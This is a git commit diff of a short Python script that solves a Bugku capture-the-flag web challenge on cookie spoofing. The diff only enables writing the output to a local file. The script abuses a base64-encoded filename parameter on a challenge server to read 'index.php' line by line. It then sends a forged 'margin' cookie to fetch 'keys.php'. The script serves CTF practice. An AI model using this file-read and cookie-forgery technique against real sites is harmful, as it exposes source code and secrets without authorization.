9a01fb7b3914e6c9c0b76c3dafed7a074d9ff2ca
SAndroid17 <53066394+SAndroid17@users.noreply.github.com>
2020-02-21 21:19:02 +0800

    bugku的cookies欺骗
    bugku的cookies欺骗

--- bugkucookies欺骗.py
+++ bugkucookies欺骗.py
@@ -1,16 +1,16 @@
 
 import requests
-#f=open("cookies欺骗.txt","w")
+f=open("cookies欺骗.txt","w")
 url="http://123.206.87.240:8002/web11/index.php?line="
 last="&filename=aW5kZXgucGhw="#设置后缀
 list1=[]
 req=requests.Session()#建立会话
 for i in range(20):
     txt1=req.get(url+str(i)+last).text#设置请求来获取index.php的内容
-    #f.write(txt1)
+    f.write(txt1)
     #print(txt1)
     list1.append([txt1])
-#f.close()
+f.close()
 cookies={"margin":"margin"}
 res=req.get(url+str(0)+"&filename=a2V5cy5waHA=",cookies=cookies)#将cookie提交上去然后获取每一行的代码
 print(res.text)
